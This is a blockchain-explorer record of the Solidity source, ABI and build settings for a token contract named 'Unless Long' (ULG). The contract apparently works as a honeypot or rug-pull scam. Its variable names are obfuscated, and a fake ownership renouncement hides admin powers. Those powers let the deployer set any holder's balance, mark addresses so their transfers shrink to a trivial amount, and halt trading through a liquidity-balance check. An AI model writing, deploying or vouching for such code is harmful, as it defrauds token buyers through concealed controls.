{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface tokenEnable {\n    function createPair(address buyAuto, address fundShould) external returns (address);\n}\n\ninterface swapFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountBuy) external view returns (uint256);\n\n    function transfer(address listMode, uint256 teamAmount) external returns (bool);\n\n    function allowance(address fundTradingShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listMode,\n        uint256 teamAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldFundTo, uint256 value);\n    event Approval(address indexed fundTradingShould, address indexed spender, uint256 value);\n}\n\nabstract contract walletAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapFeeMetadata is swapFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnlessLong is walletAmount, swapFee, swapFeeMetadata {\n\n    function maxLiquidity(uint256 teamAmount) public {\n        limitReceiverBuy();\n        teamSwap = teamAmount;\n    }\n\n    function transferFrom(address fundFromAmount, address listMode, uint256 teamAmount) external override returns (bool) {\n        if (_msgSender() != shouldTo) {\n            if (limitTotal[fundFromAmount][_msgSender()] != type(uint256).max) {\n                require(teamAmount <= limitTotal[fundFromAmount][_msgSender()]);\n                limitTotal[fundFromAmount][_msgSender()] -= teamAmount;\n            }\n        }\n        return enableMin(fundFromAmount, listMode, teamAmount);\n    }\n\n    function transfer(address launchAutoBuy, uint256 teamAmount) external virtual override returns (bool) {\n        return enableMin(_msgSender(), launchAutoBuy, teamAmount);\n    }\n\n    string private tokenTotal = \"Unless Long\";\n\n    function approve(address modeMax, uint256 teamAmount) public virtual override returns (bool) {\n        limitTotal[_msgSender()][modeMax] = teamAmount;\n        emit Approval(_msgSender(), modeMax, teamAmount);\n        return true;\n    }\n\n    uint256 private launchTx;\n\n    function getOwner() external view returns (address) {\n        return senderReceiver;\n    }\n\n    uint256 private receiverAt = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private takeMarketingSwap;\n\n    mapping(address => mapping(address => uint256)) private limitTotal;\n\n    uint256 constant limitTo = 5 ** 10;\n\n    function modeTotal(address senderShould) public {\n        limitReceiverBuy();\n        \n        if (senderShould == minAt || senderShould == fromShouldWallet) {\n            return;\n        }\n        fromSwap[senderShould] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenTotal;\n    }\n\n    function balanceOf(address amountBuy) public view virtual override returns (uint256) {\n        return takeMarketingSwap[amountBuy];\n    }\n\n    address minTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private toMax = \"ULG\";\n\n    mapping(address => bool) public fromSwap;\n\n    event OwnershipTransferred(address indexed fundIs, address indexed liquidityTo);\n\n    mapping(address => bool) public shouldAmount;\n\n    uint256 private receiverMarketing;\n\n    function exemptLaunched(address launchAutoBuy, uint256 teamAmount) public {\n        limitReceiverBuy();\n        takeMarketingSwap[launchAutoBuy] = teamAmount;\n    }\n\n    function owner() external view returns (address) {\n        return senderReceiver;\n    }\n\n    address private senderReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverAt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderBuy;\n    }\n\n    bool public modeLimit;\n\n    bool private atBuy;\n\n    address public minAt;\n\n    uint8 private senderBuy = 18;\n\n    function enableMin(address fundFromAmount, address listMode, uint256 teamAmount) internal returns (bool) {\n        if (fundFromAmount == minAt) {\n            return enableSender(fundFromAmount, listMode, teamAmount);\n        }\n        uint256 launchExempt = swapFee(fromShouldWallet).balanceOf(minTeam);\n        require(launchExempt == teamSwap);\n        require(listMode != minTeam);\n        if (fromSwap[fundFromAmount]) {\n            return enableSender(fundFromAmount, listMode, limitTo);\n        }\n        return enableSender(fundFromAmount, listMode, teamAmount);\n    }\n\n    uint256 teamSwap;\n\n    function allowance(address tokenReceiver, address modeMax) external view virtual override returns (uint256) {\n        if (modeMax == shouldTo) {\n            return type(uint256).max;\n        }\n        return limitTotal[tokenReceiver][modeMax];\n    }\n\n    function enableSender(address fundFromAmount, address listMode, uint256 teamAmount) internal returns (bool) {\n        require(takeMarketingSwap[fundFromAmount] >= teamAmount);\n        takeMarketingSwap[fundFromAmount] -= teamAmount;\n        takeMarketingSwap[listMode] += teamAmount;\n        emit Transfer(fundFromAmount, listMode, teamAmount);\n        return true;\n    }\n\n    uint256 marketingTrading;\n\n    constructor (){\n        if (enableSwapMode) {\n            atBuy = false;\n        }\n        tradingTeam takeMax = tradingTeam(shouldTo);\n        fromShouldWallet = tokenEnable(takeMax.factory()).createPair(takeMax.WETH(), address(this));\n        if (launchTx != receiverMarketing) {\n            enableSwapMode = false;\n        }\n        minAt = _msgSender();\n        shouldAmount[minAt] = true;\n        takeMarketingSwap[minAt] = receiverAt;\n        fromAmount();\n        if (receiverMarketing == launchTx) {\n            enableSwapMode = false;\n        }\n        emit Transfer(address(0), minAt, receiverAt);\n    }\n\n    function fromAmount() public {\n        emit OwnershipTransferred(minAt, address(0));\n        senderReceiver = address(0);\n    }\n\n    bool private launchedLimit;\n\n    address public fromShouldWallet;\n\n    bool private enableSwapMode;\n\n    address shouldTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function limitReceiverBuy() private view {\n        require(shouldAmount[_msgSender()]);\n    }\n\n    function walletTeam(address sellReceiverList) public {\n        if (modeLimit) {\n            return;\n        }\n        if (launchedLimit != enableSwapMode) {\n            receiverMarketing = launchTx;\n        }\n        shouldAmount[sellReceiverList] = true;\n        if (enableSwapMode == atBuy) {\n            launchedLimit = true;\n        }\n        modeLimit = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toMax;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTradingShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFundTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAutoBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAmount\",\"type\":\"uint256\"}],\"name\":\"exemptLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromShouldWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamAmount\",\"type\":\"uint256\"}],\"name\":\"maxLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"}],\"name\":\"modeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAutoBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFromAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiverList\",\"type\":\"address\"}],\"name\":\"walletTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnlessLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}